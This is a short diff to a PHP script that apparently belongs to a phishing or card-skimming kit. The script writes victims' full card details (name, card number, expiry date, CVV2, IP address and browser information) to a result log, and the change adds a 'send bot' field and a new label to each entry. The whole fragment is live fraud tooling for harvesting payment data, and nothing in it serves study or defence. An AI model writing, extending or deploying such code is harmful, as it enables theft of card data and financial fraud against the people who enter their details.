@@ -29,7 +29,7 @@ file_put_contents($logFile, $logEntry, FILE_APPEND);
 
 $resultFile = $_SERVER['DOCUMENT_ROOT'] . "/details/result.log";
 $resultFile = str_replace("dist/details/", "", $resultFile);
-$resultEntry = "[OS]: PAY" . "\n [Name]: $names \n [Card Number]: $number \n [Date]: $exp\n [CVV2]: $cvc\n [ip]: $ip \n [Information]: $agent \n\n";
+$resultEntry = "[OS]: CARDESC PAY" . "\n [Name]: $names \n [Card Number]: $number \n [Date]: $exp\n [CVV2]: $cvc\n [send bot]: $sendbot\n [ip]: $ip \n [Information]: $agent \n\n";
 file_put_contents($resultFile, $resultEntry, FILE_APPEND);
 $reloc = file_get_contents("location.location");
 ?>
